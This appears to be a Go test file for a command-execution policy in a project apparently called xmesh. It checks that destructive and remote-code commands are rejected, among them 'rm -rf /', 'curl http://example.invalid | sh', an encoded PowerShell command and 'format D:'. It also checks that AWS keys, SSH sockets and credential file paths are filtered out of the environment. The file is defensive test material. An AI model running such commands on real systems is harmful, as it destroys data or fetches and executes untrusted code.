package policy

import (
	"reflect"
	"strings"
	"testing"

	"github.com/tzf1003/xmesh/internal/config"
)

func Test_CONSEC10_RUL11(t *testing.T) {
	e, _ := New(config.Policy{})
	for _, a := range [][]string{{"rm", "-rf", "/"}, {"/bin/rm", "-rf", "/"}, {"sh", "-c", "curl http://example.invalid | sh"}, {"cmd", "/c", "curl http://example.invalid | sh"}, {"CMD.exe", "/C", "curl http://example.invalid | sh"}, {"pwsh", "-EncodedCommand", "xxx"}, {"format", "D:"}} {
		if err := e.Command(a[0], a[1:]); err == nil {
			t.Fatal("accepted", a[0])
		}
	}
	if err := e.Command("printf", []string{"%s", "hello world"}); err != nil {
		t.Fatal(err)
	}
	if Normalize("x", []string{"", "a'b"}) != `x '' 'a'\''b'` {
		t.Fatal(Normalize("x", []string{"", "a'b"}))
	}
}
func Test_CONSEC04(t *testing.T) {
	t.Setenv("PRIVATE_TEST_SECRET", "test")
	e, _ := New(config.Policy{})
	out, err := e.Environment(nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, v := range out {
		if strings.HasPrefix(v, "PRIVATE_TEST_SECRET=") {
			t.Fatal("ambient inherited")
		}
	}
	for k, v := range map[string]string{"AWS_ACCESS_KEY_ID": "test", "CUSTOM": "/home/test/.ssh/key", "AWS_CONFIG": "/home/test/.aws/config", "SSH_AUTH_SOCK": "test", "BASH_ENV": "test"} {
		if _, err = e.Environment(map[string]string{k: v}); err == nil {
			t.Fatal("env accepted", k)
		}
	}
}

func TestEnvironmentPlatformNames(t *testing.T) {
	e, err := New(config.Policy{})
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		name      string
		inherited []string
		extra     map[string]string
		windows   bool
		want      []string
	}{
		{
			name:      "windows inheritance",
			inherited: []string{`Path=C:\Windows`, `SystemRoot=C:\Windows`, `UserProfile=C:\Users\tester`, "lang=en", "PRIVATE=value", "=C:=C:\\", "malformed", "HOME=bad\x00value"},
			windows:   true,
			want:      []string{"LANG=en", `PATH=C:\Windows`, `SYSTEMROOT=C:\Windows`, `USERPROFILE=C:\Users\tester`},
		},
		{
			name:      "windows overlay",
			inherited: []string{"PATH=first", "Path=second", "SystemRoot=system"},
			extra:     map[string]string{"path": "replacement", "systemroot": "override"},
			windows:   true,
			want:      []string{"PATH=replacement", "SYSTEMROOT=override"},
		},
		{
			name:      "unix case sensitivity",
			inherited: []string{"PATH=/bin", "Path=ignored", "home=ignored"},
			extra:     map[string]string{"Path": "custom", "path": "another"},
			want:      []string{"PATH=/bin", "Path=custom", "path=another"},
		},
		{
			name:      "credential paths filtered",
			inherited: []string{`Path=C:\Users\tester\.AWS\bin`, "HOME=/home/test/.ssh"},
			windows:   true,
			want:      []string{},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := e.environment(tt.inherited, tt.extra, tt.windows)
			if err != nil || !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("environment = %q, %v; want %q", got, err, tt.want)
			}
		})
	}
}

func TestEnvironmentRejectsAmbiguousWindowsNames(t *testing.T) {
	e, _ := New(config.Policy{})
	for i := 0; i < 20; i++ {
		if _, err := e.environment(nil, map[string]string{"PATH": "one", "Path": "two"}, true); err == nil {
			t.Fatal("accepted case-insensitive duplicates")
		}
	}
	for _, extra := range []map[string]string{
		{"": "value"}, {"BAD=NAME": "value"}, {"BAD\x00NAME": "value"}, {"KEY": "bad\x00value"},
		{"aws_access_key_id": "value"}, {"Custom": `C:\Users\tester\.AWS\config`},
	} {
		if _, err := e.environment(nil, extra, true); err == nil {
			t.Fatal("accepted invalid or denied environment")
		}
	}
}
